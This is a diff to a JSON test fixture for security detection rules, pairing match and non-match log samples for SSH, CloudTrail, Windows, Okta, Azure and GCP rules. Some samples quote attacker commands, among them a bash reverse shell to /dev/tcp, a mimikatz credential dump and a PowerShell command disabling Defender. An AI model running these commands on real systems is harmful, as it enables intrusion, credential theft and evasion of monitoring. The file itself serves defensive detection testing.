@@ -2,82 +2,310 @@
   "_comment": "CI ground truth: every rule id must (a) match every 'match' example and (b) NOT match every 'nomatch' example. test_detection.py enforces this and fails if any rule lacks fixtures.",
   "furix-0001-ssh-bruteforce-success": {
     "match": [
-      {"log_type": "syslog", "raw_log": "Jan 1 10:00:01 host sshd[1]: Failed password for root from 45.33.32.156\nJan 1 10:05:01 host sshd[1]: Accepted password for root from 45.33.32.156"}
+      {
+        "log_type": "syslog",
+        "raw_log": "Jan 1 10:00:01 host sshd[1]: Failed password for root from 45.33.32.156\nJan 1 10:05:01 host sshd[1]: Accepted password for root from 45.33.32.156"
+      }
     ],
     "nomatch": [
-      {"log_type": "syslog", "raw_log": "Jan 1 10:00:01 host sshd[1]: Failed password for root from 45.33.32.156"}
+      {
+        "log_type": "syslog",
+        "raw_log": "Jan 1 10:00:01 host sshd[1]: Failed password for root from 45.33.32.156"
+      }
     ]
   },
   "furix-0002-ssh-bruteforce": {
     "match": [
-      {"log_type": "syslog", "raw_log": "Jan 1 10:00:01 host sshd[1]: Failed password for admin from 10.0.0.9"}
+      {
+        "log_type": "syslog",
+        "raw_log": "Jan 1 10:00:01 host sshd[1]: Failed password for admin from 10.0.0.9"
+      }
     ],
     "nomatch": [
-      {"log_type": "syslog", "raw_log": "Jan 1 10:00:01 host sshd[1]: Accepted publickey for deploy"}
+      {
+        "log_type": "syslog",
+        "raw_log": "Jan 1 10:00:01 host sshd[1]: Accepted publickey for deploy"
+      }
     ]
   },
   "furix-0010-cloudtrail-createuser": {
     "match": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"CreateUser\",\"eventSource\":\"iam.amazonaws.com\",\"requestParameters\":{\"userName\":\"backdoor_admin\"}}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"CreateUser\",\"eventSource\":\"iam.amazonaws.com\",\"requestParameters\":{\"userName\":\"backdoor_admin\"}}"
+      }
     ],
     "nomatch": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"ConsoleLogin\",\"eventSource\":\"signin.amazonaws.com\"}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"ConsoleLogin\",\"eventSource\":\"signin.amazonaws.com\"}"
+      }
     ]
   },
   "furix-0011-cloudtrail-admin-attach": {
     "match": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"AttachUserPolicy\",\"requestParameters\":{\"policyArn\":\"arn:aws:iam::aws:policy/AdministratorAccess\",\"userName\":\"backdoor_admin\"}}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"AttachUserPolicy\",\"requestParameters\":{\"policyArn\":\"arn:aws:iam::aws:policy/AdministratorAccess\",\"userName\":\"backdoor_admin\"}}"
+      }
     ],
     "nomatch": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"AttachUserPolicy\",\"requestParameters\":{\"policyArn\":\"arn:aws:iam::aws:policy/ReadOnlyAccess\",\"userName\":\"analyst\"}}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"AttachUserPolicy\",\"requestParameters\":{\"policyArn\":\"arn:aws:iam::aws:policy/ReadOnlyAccess\",\"userName\":\"analyst\"}}"
+      }
     ]
   },
   "furix-0012-cloudtrail-no-mfa": {
     "match": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"additionalEventData\":{\"MFAUsed\":\"No\"}}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"additionalEventData\":{\"MFAUsed\":\"No\"}}"
+      }
     ],
     "nomatch": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"additionalEventData\":{\"MFAUsed\":\"Yes\"}}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"additionalEventData\":{\"MFAUsed\":\"Yes\"}}"
+      }
     ]
   },
   "furix-0013-cloudtrail-getsecret": {
     "match": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"GetSecretValue\",\"eventSource\":\"secretsmanager.amazonaws.com\",\"requestParameters\":{\"secretId\":\"prod/db/password\"}}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"GetSecretValue\",\"eventSource\":\"secretsmanager.amazonaws.com\",\"requestParameters\":{\"secretId\":\"prod/db/password\"}}"
+      }
     ],
     "nomatch": [
-      {"log_type": "cloudtrail", "raw_log": "{\"eventName\":\"DescribeSecret\",\"eventSource\":\"secretsmanager.amazonaws.com\"}"}
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"DescribeSecret\",\"eventSource\":\"secretsmanager.amazonaws.com\"}"
+      }
     ]
   },
   "furix-0020-windows-mimikatz": {
     "match": [
-      {"log_type": "windows_evtx", "raw_log": "EventID: 4688 Process: C:\\Tools\\mimikatz.exe CommandLine: sekurlsa::logonpasswords"}
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4688 Process: C:\\Tools\\mimikatz.exe CommandLine: sekurlsa::logonpasswords"
+      }
     ],
     "nomatch": [
-      {"log_type": "windows_evtx", "raw_log": "EventID: 4688 Process: C:\\Windows\\explorer.exe"}
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4688 Process: C:\\Windows\\explorer.exe"
+      }
     ]
   },
   "furix-0021-windows-new-service": {
     "match": [
-      {"log_type": "windows_evtx", "raw_log": "EventID: 7045 A new service was installed. Service Name: EvilSvc"}
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 7045 A new service was installed. Service Name: EvilSvc"
+      }
     ],
     "nomatch": [
-      {"log_type": "windows_evtx", "raw_log": "EventID: 4624 An account was successfully logged on. Service ticket issued"}
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4624 An account was successfully logged on. Service ticket issued"
+      }
     ]
   },
   "furix-0022-windows-4720": {
     "match": [
-      {"log_type": "windows_evtx", "raw_log": "EventID: 4720 A user account was created. Account Name: backdoor_user"}
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4720 A user account was created. Account Name: backdoor_user"
+      }
     ],
     "nomatch": [
-      {"log_type": "windows_evtx", "raw_log": "EventID: 4624 An account was successfully logged on."}
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4624 An account was successfully logged on."
+      }
     ]
   },
   "furix-0030-okta-super-admin": {
     "match": [
-      {"log_type": "okta_sso", "raw_log": "{\"eventType\":\"user.account.privilege.grant\",\"target\":[{\"displayName\":\"Super Administrator\"}]}"}
+      {
+        "log_type": "okta_sso",
+        "raw_log": "{\"eventType\":\"user.account.privilege.grant\",\"target\":[{\"displayName\":\"Super Administrator\"}]}"
+      }
     ],
     "nomatch": [
-      {"log_type": "okta_sso", "raw_log": "{\"eventType\":\"user.session.start\",\"outcome\":{\"result\":\"SUCCESS\"}}"}
+      {
+        "log_type": "okta_sso",
+        "raw_log": "{\"eventType\":\"user.session.start\",\"outcome\":{\"result\":\"SUCCESS\"}}"
+      }
+    ]
+  },
+  "furix-0023-windows-clear-logs": {
+    "match": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 1102 The audit log was cleared. Account: attacker"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4624 An account was successfully logged on."
+      }
+    ]
+  },
+  "furix-0024-windows-disable-defender": {
+    "match": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4688 PowerShell Set-MpPreference -DisableRealtimeMonitoring $true"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4688 PowerShell Get-MpPreference"
+      }
+    ]
+  },
+  "furix-0025-windows-rdp-logon": {
+    "match": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4624 An account was logged on. LogonType: 10 RemoteInteractive Source: 45.33.32.156"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4624 An account was logged on. LogonType: 2 Interactive"
+      }
+    ]
+  },
+  "furix-0026-windows-schtasks": {
+    "match": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4688 CommandLine: schtasks /create /tn EvilTask /tr C:\\Temp\\evil.exe"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "windows_evtx",
+        "raw_log": "EventID: 4688 CommandLine: schtasks /query"
+      }
+    ]
+  },
+  "furix-0014-cloudtrail-stop-logging": {
+    "match": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"StopLogging\",\"eventSource\":\"cloudtrail.amazonaws.com\"}"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"StartLogging\",\"eventSource\":\"cloudtrail.amazonaws.com\"}"
+      }
+    ]
+  },
+  "furix-0015-cloudtrail-root": {
+    "match": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"ConsoleLogin\",\"eventSource\":\"signin.amazonaws.com\",\"userIdentity\":{\"type\":\"Root\"}}"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"ConsoleLogin\",\"eventSource\":\"signin.amazonaws.com\",\"userIdentity\":{\"type\":\"IAMUser\"}}"
+      }
+    ]
+  },
+  "furix-0016-cloudtrail-open-sg": {
+    "match": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"AuthorizeSecurityGroupIngress\",\"eventSource\":\"ec2.amazonaws.com\",\"requestParameters\":{\"cidrIp\":\"0.0.0.0/0\"}}"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"AuthorizeSecurityGroupIngress\",\"eventSource\":\"ec2.amazonaws.com\",\"requestParameters\":{\"cidrIp\":\"10.0.0.0/8\"}}"
+      }
+    ]
+  },
+  "furix-0017-cloudtrail-access-key": {
+    "match": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"CreateAccessKey\",\"eventSource\":\"iam.amazonaws.com\",\"requestParameters\":{\"userName\":\"svc\"}}"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "cloudtrail",
+        "raw_log": "{\"eventName\":\"ListAccessKeys\",\"eventSource\":\"iam.amazonaws.com\"}"
+      }
+    ]
+  },
+  "furix-0031-okta-mfa-deactivate": {
+    "match": [
+      {
+        "log_type": "okta_sso",
+        "raw_log": "{\"eventType\":\"user.mfa.factor.deactivate\",\"published\":\"2026-07-16T09:00:00Z\"}"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "okta_sso",
+        "raw_log": "{\"eventType\":\"user.session.start\",\"published\":\"2026-07-16T09:00:00Z\"}"
+      }
+    ]
+  },
+  "furix-0040-azure-ca-disabled": {
+    "match": [
+      {
+        "log_type": "azure_ad",
+        "raw_log": "{\"operationName\":\"Disable conditional access policy\",\"userPrincipalName\":\"admin@corp.com\"}"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "azure_ad",
+        "raw_log": "{\"operationName\":\"Update conditional access policy\",\"userPrincipalName\":\"admin@corp.com\"}"
+      }
+    ]
+  },
+  "furix-0050-gcp-sa-key": {
+    "match": [
+      {
+        "log_type": "gcp_audit",
+        "raw_log": "{\"protoPayload\":{\"methodName\":\"google.iam.admin.v1.CreateServiceAccountKey\"}}"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "gcp_audit",
+        "raw_log": "{\"protoPayload\":{\"methodName\":\"storage.objects.get\"}}"
+      }
+    ]
+  },
+  "furix-0060-linux-reverse-shell": {
+    "match": [
+      {
+        "log_type": "syslog",
+        "raw_log": "Jul 16 09:00:01 web01 bash[4021]: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+      }
+    ],
+    "nomatch": [
+      {
+        "log_type": "syslog",
+        "raw_log": "Jul 16 09:00:01 web01 sshd[5001]: Accepted publickey for deploy from 10.0.0.9"
+      }
     ]
   }
 }
